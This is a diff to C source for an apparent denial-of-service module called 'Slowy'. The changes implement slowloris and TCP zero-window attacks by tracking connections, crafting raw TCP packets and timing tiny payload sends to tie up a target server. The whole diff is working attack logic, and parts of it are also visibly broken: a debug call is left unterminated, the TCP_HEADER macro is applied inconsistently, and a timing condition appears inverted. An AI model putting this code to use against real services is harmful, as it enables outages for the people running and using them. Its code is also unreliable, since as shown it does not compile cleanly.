@@ -43,13 +43,13 @@ typedef struct _tag_TCPCON {
   int         sport;
   int         mss;
 
-  int         timeout; /* milis to wait before sending */
-  int         winsize; /* current win size             */
+  double      timeout; /* time to wait before sending (0 = send nothing) */
+  int         window;  /* current win size                               */
   unsigned    flags;
-  unsigned    seq;     /* seq                          */
-  unsigned    ack;     /* last acked bytes             */
-  int         offset;  /* current offset               */
-  int         tosend;  /* next bytes to sent           */
+  unsigned    seq;     /* seq                                            */
+  unsigned    ack;     /* last acked bytes                               */
+  int         offset;  /* current offset                                 */
+  int         tosend;  /* next bytes to sent                             */
   struct _tag_TCPCON *next;
 } TCP_CON;
 
@@ -58,7 +58,7 @@ typedef struct _tag_SLOWY_CFG {
   INET_ADDR   dhost;
   int         mss;
   int         zerowin;
-  unsigned    timeout;
+  double      timeout;
   char       *payload;
   unsigned    payload_size;
   TCP_CON    *conns[256];
@@ -98,13 +98,13 @@ static TCP_CON *conn_new(THREAD_WORK *tw, int sport)
   return c;
 }
 
-static TCP_CON *conn_find(THREAD_WORK *tw, int sport)
+static TCP_CON *conn_get(THREAD_WORK *tw, int sport)
 {
   SLOWY_CFG *tc = (SLOWY_CFG *) tw->data;
   TCP_CON *c;
   unsigned i;
 
-  i = ((unsigned) c->sport) >> 8;
+  i = ((unsigned) sport) >> 8;
   for(c = tc->conns[i]; c && c->sport != sport; c = c->next)
     ;
 
@@ -161,6 +161,8 @@ static void slowy__listen(THREAD_WORK *tw)
   SLOWY_CFG *tc = (SLOWY_CFG *) tw->data;
   TEA_MSG *m;
   TCP_CON *c;
+  int i;
+  double t;
 
   /* listen the radio */
   while((m = tea_mqueue_shift(tw->mqueue)) != NULL)
@@ -179,6 +181,7 @@ static void slowy__listen(THREAD_WORK *tw)
     if(TCP_HEADER(m->b)->syn != 0
     && TCP_HEADER(m->b)->ack != 0)
     {
+      TDBG2("Received << %d - %d.%d.%d.%d:%d/%d (rst=%d) => [%08x/%08x] >>",
       /* register connection */
       c = conn_new(tw, TCP_HEADER(m->b)->dest);
 
@@ -201,10 +204,19 @@ static void slowy__listen(THREAD_WORK *tw)
       c->seq     = TCP_HEADER(m->b)->ack_seq;
       c->ack     = TCP_HEADER(m->b)->seq + 1;
       c->flags   = TH_ACK;
+    } else
+      c = conn_get(tw, TCP_HEADER(m->b)->dest);
+
+    if(!c)
+    {
+      TDBG("Ignored connection at port %d.", TCP_HEADER(m->b)->dest);
+      continue;
     }
 
     if(TCP_HEADER(m->b)->ack != 0)
     {
+      int s;
+
       /* decide how much to send ... */
       s = tc->zerowin ? c->mss : (rand() & 0x07) + 1;
 
@@ -215,18 +227,22 @@ static void slowy__listen(THREAD_WORK *tw)
         c->flags   = TH_ACK;
       } else {
         c->tosend  = tc->payload_size - c->offset;
-        c->flags   = TH_ACK | TH_PUSH;
+        c->flags   = c->tosend > 0 ? TH_ACK | TH_PUSH : TH_ACK;
       }
 
       /* decide other parameters (depending on attack) */
+      c->timeout = pthreadex_time_get();
       if(tc->zerowin)
       {
         /* (zerowin) */
-        c->timeout = 0;
-        c->window  = c->window - XXX; /* XXX TODO XXX */
+        s = m->s - (TCP_HEADER(m)->doff << 2) - (IP_HEADER(m)->ihl << 2);
+        c->window  = c->window > s ? c->window - s : 0;
+        if(c->window == 0)
+          c->timeout += tc->timeout;
       } else {
         /* (slowloris) */
-        c->timeout = XXX; /* XXX TODO XXX */
+        if(c->tosend > 0)
+          c->timeout += tc->timeout;
       }
     } else
     if(TCP_HEADER(m->b)->fin != 0
@@ -234,7 +250,19 @@ static void slowy__listen(THREAD_WORK *tw)
     {
       /* kill connection */
       /*   - (fin) schedule fin/ack packet */
+      if(!TCP_HEADER(m->b)->rst)
+        ln_send_tcp_packet(tc->lnc,
+                           &tc->shost.addr.in.inaddr, ntohs(TCP_HEADER(m->b)->dest),
+                           &tc->dhost.addr.in.inaddr, tc->dhost.port,
+                           TH_FIN | TH_ACK,
+                           ntohs(TCP_HEADER(m->b)->window),
+                           ntohl(TCP_HEADER(m->b)->ack_seq),
+                           ntohl(TCP_HEADER(m->b)->seq) + 1,
+                           NULL, 0,
+                           NULL, 0);
+
       /*   - (fin&rst) remove directly */
+      conn_release(tw, c);
     }
 
     /* release msg buffer */
@@ -242,20 +270,23 @@ static void slowy__listen(THREAD_WORK *tw)
   }
 
   /* send scheduled packets */
-  /* XXX TODO XXX */
-  for()
-  {
-    /* send request in one TCP packet */
-    ln_send_tcp_packet(tc->lnc,
-                       &tc->shost.addr.in.inaddr, ntohs(TCP_HEADER(m->b)->dest),
-                       &tc->dhost.addr.in.inaddr, tc->dhost.port,
-                       TH_ACK | TH_PUSH,
-                       ntohs(c->window),
-                       ntohl(c->seq),
-                       ntohl(c->ack),
-                       ((char *) tc->payload) + c->offset, c->tosend,
-                       NULL, 0);
-  }
+  t = pthreadex_time_get();
+  for(i = 0; i < 256; i++)
+    for(c = tc->conns[i]; c; c = c->next)
+      if(c->timeout > 0 && t < c->timeout)
+      {
+        /* send request in one TCP packet */
+        ln_send_tcp_packet(tc->lnc,
+                           &tc->shost.addr.in.inaddr, ntohs(TCP_HEADER(m->b)->dest),
+                           &tc->dhost.addr.in.inaddr, tc->dhost.port,
+                           TH_ACK | TH_PUSH,
+                           ntohs(c->window),
+                           ntohl(c->seq),
+                           ntohl(c->ack),
+                           ((char *) tc->payload) + c->offset, c->tosend,
+                           NULL, 0);
+        c->timeout = 0;
+      }
 }
 
 /*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
@@ -282,6 +313,15 @@ static int slowy__configure(THREAD_WORK *tw, SNODE *command)
     if((tc->lnc = calloc(1, sizeof(LN_CONTEXT))) == NULL)
       TFAT("No memory for LN_CONTEXT.");
     ln_init_context(tc->lnc);
+  }
+
+  /* select attack type */
+  switch(command->command.thc.to->type)
+  {
+    case TYPE_TO_ZWIN: tc->zerowin = 1; break;
+    case TYPE_TO_SLOW: tc->zerowin = 0; break;
+    default:
+      TFAT("Uknown attack type %d.", command->command.thc.to->type);
   }
 
   /* read from SNODE command parameters */
@@ -384,8 +424,8 @@ static void slowy__cleanup(THREAD_WORK *tw)
  * TEA OBJECT
  *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/
 
-TEA_OBJECT teaSLOWY = {
-  .name         = "SLOWY",
+TEA_OBJECT teaSlowy = {
+  .name         = "Slowy",
   .configure    = slowy__configure,
   .cleanup      = slowy__cleanup,
   .listen       = slowy__listen,
